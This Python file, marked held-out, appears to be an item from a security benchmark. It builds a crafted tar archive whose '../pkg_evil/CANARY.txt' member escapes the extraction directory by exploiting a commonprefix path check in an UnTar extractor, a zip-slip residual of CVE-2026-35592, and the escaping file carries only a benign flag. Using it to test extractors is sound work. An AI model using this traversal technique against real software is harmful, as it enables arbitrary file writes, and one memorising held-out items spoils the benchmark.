#!/usr/bin/env python3
"""[HELD-OUT] CVE-2026-35592 residual exploit — tar "zip-slip" via UnTar._safe_extractall.

The CVE-2026-32808 fix (commit 5f4f0fa) added the correct fs.is_within_directory
(os.path.commonpath) guard and wired it into SevenZip/UnRar/UnZip/HjSplit and
UnTar.list()/verify() — but LEFT UnTar._safe_extractall() using the flawed
STRING-level `os.path.commonprefix()` check. commonprefix passes for a SIBLING
directory whose name shares a string prefix with the extraction dir, e.g. for
dest basename `pkg`, a member `../pkg_evil/CANARY.txt` normalises to
`<dl>/pkg_evil/CANARY.txt`:

    commonprefix(["/data/dl/pkg", "/data/dl/pkg_evil/CANARY.txt"]) == "/data/dl/pkg"  -> check PASSES (bug)
    commonpath  (["/data/dl/pkg", "/data/dl/pkg_evil/CANARY.txt"]) == "/data/dl"      -> check FAILS  (fix)

So this crafted tar WRITES a file one directory OUTSIDE the extraction dir. The
benign benchmark canary: the escaping member's CONTENT is the per-run ${PCB_FLAG}
token, so a successful out-of-bounds write makes the flag observable at the
out-of-bounds path.

Contract:  escapes on V1 (commonprefix, residual OPEN)  ;  BLOCKED on V2, where
CVE-2026-35592's fix (commit 0fc250c9) switches _safe_extractall to commonpath.
"""
from __future__ import annotations

import io
import tarfile

# Sibling-directory escape: dest basename is "pkg" (see harness), escape to "pkg_evil".
MEMBER_NAME = "../pkg_evil/CANARY.txt"


def build_tar(flag: str) -> bytes:
    """A tar whose single member escapes to <dl>/pkg_evil/CANARY.txt carrying `flag`."""
    payload = f"ZIPSLIP-WRITE {flag}\n".encode()
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w") as tar:
        info = tarfile.TarInfo(name=MEMBER_NAME)
        info.size = len(payload)
        info.mode = 0o644
        tar.addfile(info, io.BytesIO(payload))
    return buf.getvalue()


def candidate(flag: str) -> dict:
    return {
        "probe_id": "cve-2026-35592-tar-commonprefix-zipslip",
        "sink": "residual",
        "member": MEMBER_NAME,
        "tar": build_tar(flag),
    }


if __name__ == "__main__":
    print(len(build_tar("DEMO_FLAG")), "bytes; member", MEMBER_NAME)
